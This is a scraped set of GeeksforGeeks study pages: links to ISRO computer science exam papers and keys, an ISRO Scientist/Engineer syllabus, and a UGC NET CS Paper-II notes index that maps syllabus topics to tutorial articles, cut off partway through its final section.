Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ ISRO CSE Syllabus for Scientist/Engineer Exam 2018ISRO original papers and official KeysGeeksforGeeks – Official Partner of PragyanWhat are the benefits of interning as content writer at GeeksforGeeks?How to add articles to “To Do” and “Done” lists on GeeksforGeeks?A Step by Step Guide for Placement Preparation | Set 1A Step by Step Guide for Placement Preparation | Set 2Top 10 algorithms in Interview QuestionsN Queen Problem | Backtracking-3Printing all solutions in N-Queen ProblemWarnsdorff’s algorithm for Knight’s tour problemThe Knight’s tour problem | Backtracking-1Rat in a Maze | Backtracking-2Count number of ways to reach destination in a MazeCount all possible paths from top left to bottom right of a mXn matrixPrint all possible paths from top left to bottom right of a mXn matrixUnique paths in a Grid with ObstaclesUnique paths covering every non-obstacle block exactly once in a gridDepth First Search or DFS for a GraphBreadth First Search or BFS for a GraphLevel Order Binary Tree TraversalTree Traversals (Inorder, Preorder and Postorder)Inorder Tree Traversal without RecursionInorder Tree Traversal without recursion and without stack!Print Postorder traversal from given Inorder and Preorder traversalsProgram for nth Catalan NumberFind all divisors of a natural number | Set 1Overview of Data Structures | Set 1 (Linear Data Structures) ISRO original papers and official Keys Last Updated: 11-07-2018 Download links for previous years ISRO original Papers and official Keys: Original Paper Official Keys ISRO 2018 ISRO 2018 Key ISRO 2017 Dec ISRO 2017 Dec Key ISRO 2017 May ISRO 2017 May Key ISRO 2016 ISRO 2016 Key ISRO 2015 ISRO 2015 Key ISRO 2014 ISRO 2014 Key ISRO 2013 ISRO 2013 Key ISRO 2011 ISRO 2009 ISRO 2008 ISRO 2007 My Personal Notes arrow_drop_up Save Recommended Posts:GeeksforGeeks - Official Partner of PragyanISRO CSE Syllabus for Scientist/Engineer Exam 2018ISRO SC/Engineer Recruitment for CS Students - Eligibility, Exam Pattern, SyllabusUnivariate, Bivariate and Multivariate data and its analysisEndian order and binary filesLook-and-Say SequenceHow to add articles to "To Do" and "Done" lists on GeeksforGeeks?Finding the number of triangles amongst horizontal and vertical line segmentsFind k-th bit in a binary string created by repeated invert and append operationsMouseListener and MouseMotionListener in JavaShuffle a pack of cards and answer the queryfgets() and gets() in C languagevector::push_back() and vector::pop_back() in C++ STLdeque::clear() and deque::erase() in C++ STLCheck whether the number has only first and last bits set | Set 2DFA in LEX code which accepts even number of zeros and even number of onesDifference between Information and DataElection algorithm and distributed processingThe Internet and the WebIntroduction to Signals and Systems: Properties of systemsIf you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : MiscISRO Practice Tags : MiscMisc thumb_up 8 To-do Done 5 Based on 2 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Java Math min() method with Examples Next last_page ISRO CSE Syllabus for Scientist/Engineer Exam 2018 Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Misc fgets() and gets() in C languageHow to write Regular Expressions?vector::push_back() and vector::pop_back() in C++ STLRecursive FunctionsAssociation Rule More related articles in Misc Software Engineering | Prototyping ModelTop 25 Interview QuestionsOOPs | Object Oriented DesignMinimax Algorithm in Game Theory | Set 3 (Tic-Tac-Toe AI - Finding optimal move)std::unique in C++ room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

ISRO CSE Syllabus for Scientist/Engineer Exam 2018 - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ ISRO CSE Syllabus for Scientist/Engineer Exam 2018ISRO original papers and official KeysGeeksforGeeks – Official Partner of PragyanWhat are the benefits of interning as content writer at GeeksforGeeks?How to add articles to “To Do” and “Done” lists on GeeksforGeeks?A Step by Step Guide for Placement Preparation | Set 1A Step by Step Guide for Placement Preparation | Set 2Top 10 algorithms in Interview QuestionsN Queen Problem | Backtracking-3Printing all solutions in N-Queen ProblemWarnsdorff’s algorithm for Knight’s tour problemThe Knight’s tour problem | Backtracking-1Rat in a Maze | Backtracking-2Count number of ways to reach destination in a MazeCount all possible paths from top left to bottom right of a mXn matrixPrint all possible paths from top left to bottom right of a mXn matrixUnique paths in a Grid with ObstaclesUnique paths covering every non-obstacle block exactly once in a gridDepth First Search or DFS for a GraphBreadth First Search or BFS for a GraphLevel Order Binary Tree TraversalTree Traversals (Inorder, Preorder and Postorder)Inorder Tree Traversal without RecursionInorder Tree Traversal without recursion and without stack!Print Postorder traversal from given Inorder and Preorder traversalsProgram for nth Catalan NumberFind all divisors of a natural number | Set 1Overview of Data Structures | Set 1 (Linear Data Structures) ISRO CSE Syllabus for Scientist/Engineer Exam 2018 Last Updated: 28-01-2019 There is no pre-defined syllabus for the ISRO for Scientist/Engineer 2018 exam. Although, we can infer that Syllabus is similar pattern as GATE CS Syllabus and based on the curriculum taught in graduation. According to previous year question paper’s analysis, they will ask from given Subjects: Engineering Mathematics Algorithms Programming and Data Structures Operating System Database Computer Organization Computer Network Theory of Computation Compiler Design Digital Logic Software Engineering & Web Technology Microprocessor Image Processing These are useful links: ISRO original papers and official Keys ISRO Previous Year Solved Papers Topic-wise Notes Last Minute Notes Articles on Computer Science Subjects My Personal Notes arrow_drop_up Save Recommended Posts:ISRO SC/Engineer Recruitment for CS Students - Eligibility, Exam Pattern, SyllabusGATE CS 2018 Mock TestsISRO original papers and official Keys3D-Translation Transformation in Computer Graphics (Set 1)Advantages and Disadvantages of Personal digital assistantDifferent phases of projected clustering in data analyticsYouTube Automation using UIPathFriedman TestBiased GPT -3Blockchain of Things (BoT)The SON Algorithm and Map - ReduceScreen Density and Its terminologiesProof that NAE-4-SAT is NP CompleteEffective ways to increase Traffic on your WebsiteIf you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : MiscISRO Practice Tags : MiscMisc thumb_up 25 To-do Done 2.7 Based on 4 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page ISRO original papers and official Keys Next last_page Map.entries( ) In JavaScript Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Misc fgets() and gets() in C languageHow to write Regular Expressions?vector::push_back() and vector::pop_back() in C++ STLRecursive FunctionsAssociation Rule More related articles in Misc Software Engineering | Prototyping ModelTop 25 Interview QuestionsOOPs | Object Oriented DesignMinimax Algorithm in Game Theory | Set 3 (Tic-Tac-Toe AI - Finding optimal move)std::unique in C++ room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

UGC NET CS Notes according to syllabus of Paper-II - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ UGC NET CS Notes according to syllabus of Paper-II This page contains UGC NET Computer Science Preparation Notes / Tutorials on Mathematics, Algorithms, Programming and Data Structures, Operating Systems, Database Management Systems (DBMS), Computer Networks, Computer Organization and Architecture, Theory of Computation, Compiler Design, Digital Logic, and Software Engineering listed according to Paper-II of the UGC NET CS syllabus. UGC NET Syllabus (Paper-II) Learn Practice External Resources Section 1: Discrete Structures Set Theory : Sets, Relations, Functions. Pigeonhole Principle, Inclusion-Exclusion Principle, Equivalence and Partial Orderings Elementary Counting Techniques, Probability. Measure(s) for information and Mutual information Group Theory : Finite fields and Error correcting / detecting codes Graph Theory : Definition, walks, paths, trails, connected graphs, regular and bipartite graphs, cycles and circuits Tree and rooted tree. Spanning trees Eccentricity of a vertex radius and diameter of a graph. Central Graphs. Centre(s) of a tree Hamiltonian and Eulerian graphs, Planar graphs Comptutability : Models of computation-Finite Automata, Pushdown Automata Non – determinism and NFA, DPDA and PDAs and Languages accepted by these structures Grammars, Languages, Non – computability and Examples of non – computable problems. Set Theory : Introduction of Set theory Set Operations (Set theory) Power Set and its Properties Introduction and types of Relations Representations of Matrices and Graphs in Relations Closure of Relations and Equivalence Relations Classes (Injective, surjective, Bijective) of Functions Total number of possible functions Number of possible Equivalence Relations Inclusion-Exclusion and its various Applications Algebraic Structure Partial Orders Combinatorics Basics The Pigeonhole Principle PnC and Binomial Coefficients Generalized PnC Set 1 Generalized PnC Set 2 Random Variables Mean, Variance and Standard Deviation Conditional Probability Bayes’s Theorem Probability Distributions Set 1 (Uniform Distribution) Probability Distributions Set 2 (Exponential Distribution) Probability Distributions Set 3 (Normal Distribution) Probability Distributions Set 4 (Binomial Distribution) Probability Distributions Set 5 (Poisson Distribution) Group Theory : Hamming Code Graph Theory : Graph Theory Basics – Set 1 Graph Theory Basics – Set 2 Number of nodes and height of binary tree Graph Isomorphisms and Connectivity Planar Graphs and Graph Coloring Euler and Hamiltonian Paths Independent Sets, Covering and Matching Matching (graph theory) Comptutability : Introduction of Theory of Computation Finite Automata Introduction Chomsky Hierarchy Regular Expressions, Regular Grammar and Regular Languages Pumping Lemma Designing Finite Automata from Regular Expression NFA with epsilon move to DFA Conversion Conversion from NFA to DFA Minimization of DFA Regular expression from finite automata Union & Intersection of Regular languages with CFL Mealy and Moore Machines DFA of a string with at least two 0’s and at least two 1’s Star Height of Regular Expression/Language Pushdown Automata Pushdown Automata Acceptance by Final State Construct Pushdown Automata for given languages Construct Pushdown Automata for all length palindrome Closure Properties of Context Free Languages Ambiguity in Context free Grammar and Context free Languages Simplifying Context Free Grammars Converting Context Free Grammar to Chomsky Normal Form Converting Context Free Grammar to Greibach Normal Form Relationship between grammar and language Set Theory : Set Theory Combinatorics Combinatorics | Set 1 Combinatorics | Set 2 Probability Group Theory : Graph Theory : Graph Theory Comptutability : Regular languages and finite automata Practice problems on finite automata Practice problems on finite automata | Set 2 Context free languages and Push-down automata Recursively enumerable sets and Turing machines Automata Theory | Set 1 Automata Theory | Set 2 Automata Theory | Set 3 Automata Theory | Set 4 Automata Theory | Set 5 Automata Theory | Set 6 Discrete Structures : Video – NPTEL Discrete Mathematics Lectures MIT – Lecture Notes IITM – link for counting Book – Probability Notes – Probability Video – NPTEL TOC Lectures Video – TOC Lectures by Ravindrababu Ravula Notes – NFA and DFA Notes – Non Regular language Notes – PDA Section 2: Data and File Structures Data Structures : Data, Information, Definition of data structure. Arrays, stacks, queues, linked lists, trees, graphs, priority queues and heaps File Structures : Fields, records and files. Sequential, direct, index-sequential and relative files. Hashing, inverted lists and multi – lists. B trees and B+ trees Data Structures : Array Stack Queue Linked List Binary Tree Binary Search Tree Heap Tree Graph Data Structure File Structures : Indexing in Databases | Set 1 File Organization – Set 1 File Organization – Set 2 (Hashing in DBMS) File Organization – Set 3 B-Tree | Set 1 (Introduction) B-Tree | Set 2 (Insert) B-Tree | Set 3 (Delete) Database File Indexing – B+ Tree (Introduction) Data Structures : Array Stack Queue Linked List Heap Binary Trees Binary Search Trees Balanced Binary Search Trees Tree Traversals Graph Graph Traversals File Structures : File structures (sequential files, indexing, B and B+ trees) Practice questions on B and B+ Trees Data Structures : Video – NPTEL lectures Video – GeeksforGeeks Videos MIT – Introduction to Algorithms Book – CLRS Solutions Manual Visual – Data Structures and Algorithms File Structures : Notes – Indexing Visual – B Tree Notes – B+ Tree Visual – B+ Tree Section 3: Programming in C and C++ Programming in C : Elements of C – Tokens, identifiers, data types in C Control structures in C. Sequence, selection and iteration(s) Structured data types in C-arrays, struct, union, string, and pointers O – O Programming Concepts : Class, object, instantiation Inheritance, polymorphism and overloading C++ Programming : Elements of C++ – Tokens, identifiers Variables and constants, Datatypes, Operators, Control statements Functions parameter passing. Class and objects. Constructors and destructors Overloading, Inheritance, Templates, Exception handling Programming in C : C Programming Language O – O Programming Concepts : Basic Concepts of Object Oriented Programming using C++ Introduction to Object Oriented Programming in JavaScript Commonly Asked OOP Interview Questions | Set 1 Object Oriented Programming | Set 1 C++ Classes and Objects Object Oriented Programming(OOP) C++ Programming : Why C++ is partially Object Oriented Language? C++ Programming Language Programming in C : Principle of programming languages | Set 1 C Programming Mock Tests C Language | Set 1 C Language | Set 2 C Language | Set 3 C Language | Set 4 C Language | Set 5 C Language | Set 6 C Language | Set 7 C Language | Set 8 C Language | Set 9 C Language | Set 10 O – O Programming Concepts : OOP Concepts Class and Object C++ Programming : C++ Programming Mock Tests C++ Programming Multiple Choice Questions Programming in C and C++ : Video – NPTEL C lectures Video – NPTEL Problem Solving in C lectures Video – NPTEL C++ lectures Video – NPTEL C++ lectures-2 Section 4: Operating Systems (with Case Study of Unix) Main functions of operating systems Multiprogramming, multiprocessing, and multitasking Memory Management: Virtual memory, paging, fragmentation Concurrent Processing: Mutual exclusion. Critical regions, lock and unlock Scheduling: CPU scheduling, I / O scheduling, Resource scheduling. Deadlock and scheduling algorithms. Banker’s algorithm for deadlock handling UNIX: The Unix System: File system, process management, bourne shell, shell variables, command line programming Filters and Commands: Pr, head, tail, cut, paste, sort, uniq, tr, join, etc., grep, egrep, fgrep, etc., sed, awk, etc. System Calls (like): Creat, open, close, read, write, iseek, link, unlink, stat, fstat, umask, chmod, exec, fork, wait, system Introduction : What happens when we turn on computer? Introduction of Operating System – Set 1 Types of Operating Systems Dual Mode operations in OS Difference between 32-bit and 64-bit operating systems Real time systems Process Management | Introduction States of a process Process Table and Process Control Block (PCB) Process Scheduler Difference between dispatcher and scheduler Introduction of System Call Thread Threads and its types Multi threading models Benefits of Multithreading Process-based and Thread-based Multitasking User Level thread Vs Kernel Level thread Microkernel Monolithic Kernel and key differences from Microkernel Difference between multitasking, multithreading and multiprocessing CPU Scheduling : Program for FCFS Scheduling | Set 1 Program for FCFS Scheduling | Set 2 Convoy Effect in Operating Systems Program for Preemptive Priority CPU Scheduling Program for Round Robin scheduling | Set 1 Shortest Job First (or SJF) scheduling | Set 1 (Non- preemptive) Shortest Job First (SJF) scheduling | Set 2 (Preemptive) Shortest Job First scheduling with predicted burst time Highest Response Ratio Next (HRRN) Scheduling Program for Priority Scheduling | Set 1 Priority Scheduling with different arrival time – Set 2 Multilevel Queue Scheduling Multilevel Feedback Queue Scheduling Multiple-Processor Scheduling Measure the time spent in context switch? Starvation and Aging in Operating Systems Concurrent Processing : Process Synchronization | Introduction Critical Section Inter Process Communication Semaphores in operating system Mutex vs Semaphore Lock variable synchronization mechanism Deadlock : Process Management | Deadlock Introduction Deadlock Prevention And Avoidance Deadlock Detection And Recovery Resource Allocation Graph (RAG) Banker’s Algorithm Banker’s Algorithm | Set 1 (Safety Algorithm) Banker’s Algorithm : Print all the safe state Deadlock detection algorithm Memory Management : Memory management – mapping virtual address to physical addresses Memory Management | Partition Allocation Method Paging Page Table Entries Inverted Page Table Segmentation Buddy System – Memory allocation technique Allocating kernel memory (buddy system and slab system) Virtual Memory Secondary memory – Hard disk drive Page Fault Handling Page Replacement Algorithms Techniques to handle Thrashing Overlays in Memory Management Swap Space Unix : Unix Introduction : Process Management CPU Scheduling : CPU Scheduling Concurrent Processing : Concurrency and synchronization Deadlock : Deadlock Memory Management : Memory Management Virtual Memory Unix : Unix Operating Systems (with Case Study of Unix) : Video – NPTEL Lectures Video – Lectures by Ravindrababu Ravula Notes – VirginiaTech Univ. Web resource Notes – Galvin Lecture Slides Book – William Stallings Practice Problems and Solutions Notes – Virtual Memory and Cache Notes – Segmentation and Paging Notes – Some Interesting problems on Virtual memory Section 5: Computer Networks Network fundamentals : Local Area Networks (LAN), Metropolitan Area Networks (MAN), Wide Area Networks (WAN), Wireless Networks, Inter Networks Reference Models : The OSI model, TCP / IP model Data Communication : Channel capacity. Transmission media-twisted pair, coaxial cables, fibre – optic cables, wireless transmission-radio, microwave, infrared and millimeter waves. Lightwave transmission. Thelephones – local loop, trunks, multiplexing, switching, narrowband ISDN, broadband ISDN, ATM, High speed LANS. Cellular Radio. Communication satellites-geosynchronous and low-orbit Internetworking : Switch / Hub, Bridge, Router, Gateways, Concatenated virtual circuits, Tunnelling, Fragmentation, Firewalls Routing : Virtual circuits and datagrams. Routing algorithms. Congestion control Network Security : Cryptography-public key, secret key. Domain Name System (DNS) – Electronic Mail and Worldwide Web (WWW). The DNS, Resource Records, Name servers. E-mail-architecture and Serves Network Fundamentals : Basics of Computer Networking Network Topologies Types of area networks – LAN, MAN and WAN MANET: Mobile Ad hoc Network Reference Models : Layers of OSI Model TCP/IP Model User Datagram Protocol (UDP) Data Communication : Types of Transmission Media Transmission Modes in Computer Networks (Simplex, Half-Duplex and Full-Duplex) Redundant link problems Digital Subscriber Line (DSL) What is Scrambling? Difference between Unipolar, Polar and Bipolar Line Coding Schemes Analog to digital conversion Digital to Analog Conversion Analog to Analog Conversion (Modulation) Difference between Broadband and Baseband Transmission Internetworking : Internetworking Network Devices (Hub, Repeater, Bridge, Switch, Router, Gateways and Brouter) Introduction to Firewall Routing : Classification of Routing Algorithms | Set-1 Types of routing | Set-2 Classes of routing protocols | Set-3 Distance vector routing v/s Link state routing Fixed and Flooding Routing algorithms Routing v/s Routed Protocols Unicast Routing – Link State Routing Routing Protocols Set 1 (Distance Vector Routing) Route Poisoning and Count to infinity problem Onion Routing Router on a stick Circuit Switching Packet Switching and Delays Differences between Virtual Circuits & Datagram Networks Circuit Switching VS Packet Switching Network Security : Protocols in Application Layer DNS (Domain Name Server) Address Resolution in DNS DNS Spoofing or DNS Cache poisoning Why does DNS use UDP and not TCP? Deniel of Service and Prevention Digital Signatures and Certificates LZW (Lempel–Ziv–Welch) Compression technique RC4 Encryption Algorithm RSA Algorithm in Cryptography RSA Algorithm using Multiple Precision Arithmetic Library Weak RSA decryption with Chinese-remainder theorem Diffie-Hellman Algorithm DNA Cryptography Unicode Message Authentication Codes How message authentication code works? Hash Functions in System Security Network Fundamentals : Computer Networks Reference Models : Transport Layer and TCP Data Communication : Data Link Layer Internetworking : Routing : Network Layer Network Security : Application Layer Network Security Computer Networks : Video – NPTEL Lectures Video – Lectures by Ravindrababu Ravula Notes – Lecture Notes IIT Kanpur Notes – Web Resources on Computer Networks by Tanenbaum Visual – Sliding Window Animation Section 6: Relational Database Design and SQL ER Diagrams : E-R diagrams and their transformation to relational design Normalization : Normalization – 1NF, 2NF, 3NF, BCNF and 4NF Limitations of 4NF and BCNF SQL : Data Definition Language (DDL), Data Manipulation Language (DML), Data Control Language (DCL) commands Database objects like-Views, indexes, sequences, synonyms, data dictionary ER Diagrams : DBMS – Introduction | Set 1 DBMS – Introduction | Set 2 (3-Tier Architecture) DBMS Architecture 2-Level, 3-Level Need for DBMS Advantages of DBMS over File system Data Abstraction and Data Independence ER Model Recursive Relationships Minimization of ER Diagram Enhanced ER Model Mapping from ER Model to Relational Model Normalization : Database Normalization | Introduction Database Normalization | Normal Forms Functional Dependency and Attribute Closure Finding Attribute Closure and Candidate Keys using Functional Dependencies Number of possible Superkeys Lossless Decomposition Dependency Preserving Decomposition Lossless Join and Dependency Preserving Decomposition How to find the highest normal form of a relation Equivalence of Functional Dependencies Armstrong’s Axioms in Functional Dependency Canonical Cover Denormalization in Databases SQL : Structured Query Language (SQL) SQL | Datatypes SQL | DDL, DML, TCL and DCL SQL | TRANSACTIONS SQL | Views Difference between Simple and Complex View in SQL SQL | Comments SQL | Constraints SQL | Creating Roles SQL indexes SQL | SEQUENCES SQL Tutorial ER Diagrams : ER Diagrams Normalization : Normal Forms SQL : SQL Relational Database Design and SQL : Video – NPTEL Lectures Notes – Lecture Slides Silberschatz, Korth and Sudarshan Notes – Lecture Slides Raghu Ramakrishnan and Johannes Gehrke Notes – Stanford DBMS course Lecture Slides Notes – Jeff Ullman’s Lecture Slides Notes – Canonical Cover Section 7: Computer Arithmetic Prepositional and Predicate Logic : Propositional (Boolean) Logic, Predicate Logic Well – formed – formulae (WFF), Satisfiability and Tautology Logic Families : TTL, ECL and C – MOS gates Boolean algebra and Minimization of Boolean functions Design of combinational and sequential circuits Flip-flops – types, race condition and comparison Representation of Integers : Octal, Hex, Decimal, and Binary 2’s complement and 1’s complement arithmetic Floating point representation Prepositional and Predicate Logic : Representation of Boolean Functions Properties of Boolean algebra Functional Completeness Introduction to Propositional Logic | Set 1 Introduction to Propositional Logic | Set 2 Propositional Equivalences Predicates and Quantifiers | Set 1 Predicates and Quantifiers | Set 2 Rules of Inference Consensus theorem Logic Families : Logic Gates Properties of Boolean algebra Minimization of Boolean Functions Representation of Boolean Functions Canonical and Standard Form Functional Completeness K-Map (Karnaugh Map) Implicants in K-Map Variable entrant map (VEM) Half Adder Full Adder Half Subtractor Full Subtractor Half Adder and Half Subtractor using NAND NOR gates Encoders and Decoders Encoder Binary Decoder Combinational circuits using Decoder Multiplexers Carry Look-Ahead Adder Parallel Adder & Parallel Subtractor BCD Adder Magnitude Comparator BCD to 7 Segment Decoder Programmable Logic Array Programming Array Logic Read-Only Memory (ROM) Introduction of Sequential Circuits Flip-flop types and their Conversion Synchronous Sequential Circuits Counters in Digital Logic n-bit Johnson Counter Ripple Counter Design counter for given sequence Master Slave JK Flip Flop Asynchronous Sequential Circuits Shift Registers Representation of Integers : Number System and base conversions Code Converters – BCD(8421) to/from Excess-3 Code Converters – Binary to/from Gray Code Decimal to Binary Conversion Binary To Decimal Conversion Decimal to Octal Conversion Octal to Decimal Conversion Hexadecimal to Decimal Conversion Computer Arithmetic | Set – 1 Computer Arithmetic | Set – 2 Floating Point Representation Difference between 1’s Complement and 2’s Complement Booth’s Algorithm Prepositional and Predicate Logic : Propositional and First Order Logic Logic Families : Digital Logic Representation of Integers : Number Representation Digital Logic & Number representation Computer Arithmetic : Video – NPTEL Lectures Video – Lectures by Ravindrababu Ravula Notes – Number System-Swarthmore Notes – IEEE Standard 754 Floating Point Numbers Section 8: System Software and Compilers Assembly Language Fundamentals : Assembly language fundamentals (8085 based assembly language programming) Assemblers-2-pass and single-pass. Macros and macroprocessors Loader and Linker : Loading, linking, relocation, program relocatability. Linkage editing Text editors. Programming Environments. Debuggers and program generators Compiler and Basics : Compilation and Interpretation. Bootstrap compilers Phases of compilation process. Lexical analysis. Lex package on Unix system Parsing : Context free grammars. Parsing and parse trees. Representation of parse (derivation) trees as rightmost and leftmost derivations Bottom up parsers-shift-reduce, operator precedence, and LR. YACC package on Unix system Topdown parsers-left recursion and its removal. Recursive descent parser. Predictive parser Code Generation and Optimization : Intermediate codes-Quadruples, Triples, Intermediate code generation, Code generation Code optimization Assembly Language Fundamentals : Pin diagram of 8085 microprocessor Registers of 8085 microprocessor Flag register in 8085 microprocessor Addressing modes in 8085 microprocessor Arithmetic instructions in 8085 microprocessor Logical instructions in 8085 microprocessor Data transfer instructions in 8085 microprocessor Branching instructions in 8085 microprocessor Reset Accumulator (8085 & 8086 microprocessor) Difference between CALL and JUMP instructions Loader and Linker : Compiler and Basics : Compiler vs Interpreter Introduction of Compiler design Phases of a Compiler Symbol Table in Compiler Error Handling in Compiler Design Error detection and Recovery in Compiler Lexical Analysis C program to detect tokens in a C program Flex (Fast Lexical Analyzer Generator) Parsing : Classification of Context Free Grammars Ambiguous Grammar Why FIRST and FOLLOW? FIRST Set in Syntax Analysis FOLLOW Set in Syntax Analysis First and Follow sets of given grammar Introduction to Syntax Analysis Parsing | Set 1 Parsing | Set 2 Parsing | Set 3 Shift Reduce Parser in Compiler Classification of top down parsers Operator grammar and precedence parser Syntax Directed Translation Code Generation and Optimization : Runtime Environments Intermediate Code Generation Three address code in Compiler Code Optimization Introduction of Object Code Data flow analysis in Compiler Assembly Language Fundamentals : Microprocessor Loader and Linker : MCQ on Memory allocation and compilation process Compiler and Basics : Lexical analysis Parsing : Parsing and Syntax directed translation Compiler Theory | Set 1 Compiler Theory | Set 2 Code Generation and Optimization : Code Generation and Optimization System Software and Compilers : Video – NPTEL Lectures Video – Lectures by Ravindrababu Ravula Notes – Bivas Mitra IITgp Notes – LR Parsing Notes – Syntax Directed Translation Notes – Intermediate Code Generation Section 9: Software Engineering System Development Life Cycle (SDLC) : Steps, Water fall model, Prototypes, Spiral model Software Metrics : Software Project Management Software Design : System design, detailed design, function oriented design, object oriented design, user interface design Design level metrics Coding and Testing : Testing level metrics. Software quality and reliability Clean room approach, software re engineering System Development Life Cycle (SDLC) : Classical Waterfall Model Iterative Waterfall Model Incremental process model Prototyping Model COCOMO Model Spiral Model Rapid application development model (RAD) RAD Model vs Traditional SDLC Software Metrics : Classification of Software Requirements Project size estimation techniques Requirements Engineering Process Software Design : Classification of Software Coding and Testing : Software Testing | Basics Black box testing Requirements Elicitation Challenges in eliciting requirements Project Management Process Capability maturity model (CMM) System configuration management Debugging System Development Life Cycle (SDLC) : Software Engineering Software Metrics : Software Engineering Software Design : Software Engineering Coding and Testing : Software Engineering Software Engineering : Section 10: Current Trends and Technology Parallel Computing : Parallel virtual machine (pvm) and 